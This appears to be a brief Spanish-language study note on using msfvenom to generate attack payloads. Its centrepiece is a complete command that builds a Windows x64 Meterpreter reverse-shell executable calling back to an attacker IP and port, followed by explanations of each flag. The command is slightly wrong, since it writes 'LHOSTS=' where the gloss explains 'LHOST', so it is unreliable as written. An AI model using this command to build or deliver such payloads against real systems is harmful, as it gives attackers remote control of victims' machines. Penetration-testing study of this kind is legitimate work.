Con _msfvenom_, podemos crear payloads especificos para determinado sistema y con determinada finalidad. En pocas palabras, es como usar msfconsole, pero no explota nada, a la explotacion la haces vos manualmente. 

El comando puede ser el siguiene, obvio que depende de el objetivo y la victima.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOSTS=192.168.0.8 LPORT=4646 -f exe -o reverse.exe
```

_-p_ -> payload que se va a utilizar
_--platform_ -> plataforma sobre la que se va a inyectar el payload
_-a_ -> Arquitectura del procesador creo que seria
_LHOST_ -> IP atacante 
_LPORT_ -> Puerto del atacante por el que se va a entablar la [[Reverse Shell]] 
_-f_ -> tipo de archivo
_-o_ -> Output, ese es el archivo con el payload malicioso


